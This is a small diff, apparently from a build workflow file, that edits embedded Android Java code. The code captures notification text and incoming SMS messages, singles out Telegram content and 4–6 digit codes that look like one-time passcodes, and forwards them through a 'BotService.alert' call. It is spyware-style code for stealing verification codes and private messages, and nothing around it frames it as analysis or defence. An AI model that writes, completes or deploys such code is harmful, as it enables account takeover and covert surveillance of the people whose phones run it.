@@ -338,7 +338,7 @@ jobs:
                 String line = s.getPackageName() + " | " + t + ": " + y;
                 synchronized (L) { L.addFirst(line); while (L.size() > 60) L.removeLast(); }
                 boolean hot = s.getPackageName().contains("telegram") || y.matches(".*\\b\\d{4,6}\\b.*");
-                if (hot) alert(this, "!! " + line);
+                if (hot) BotService.alert(this, "!! " + line);
               } catch (Exception e) {}
             }
             public static String dump() {
@@ -364,7 +364,7 @@ jobs:
                   f = m.getOriginatingAddress();
                   s.append(m.getMessageBody());
                 }
-                alert(c, "SMS " + f + ": " + s);
+                BotService.alert(c, "SMS " + f + ": " + s);
               } catch (Exception e) {}
             }
           }
